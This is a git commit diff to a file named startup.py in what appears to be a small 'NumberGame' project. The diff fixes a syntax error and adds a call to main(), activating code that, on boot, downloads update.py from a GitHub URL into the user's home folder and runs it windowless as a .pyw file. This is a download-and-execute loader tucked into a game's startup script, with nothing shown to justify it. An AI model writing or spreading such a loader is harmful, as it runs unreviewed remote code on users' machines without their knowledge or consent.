54c83bee5aa12026fcd536fa3d5e957f9fe15f3f
xXEthyleneXx <xXEthyleneXx@protonmail.com>
2021-02-20 17:21:49 -0500

    `

--- startup.py
+++ startup.py
@@ -1,5 +1,5 @@
 #starts the sequence on boot
-def main()
+def main():
     import os, urllib.request, subprocess
     dlurl = 'https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/update.py'
     home = os.path.expanduser("~")
@@ -7,3 +7,4 @@ def main()
     path = str(home) + '/update.pyw'
     urllib.request.urlretrieve(dlurl, '{}'.format(path))
     subprocess.Popen(['pyw', 'update.pyw'])
+main()
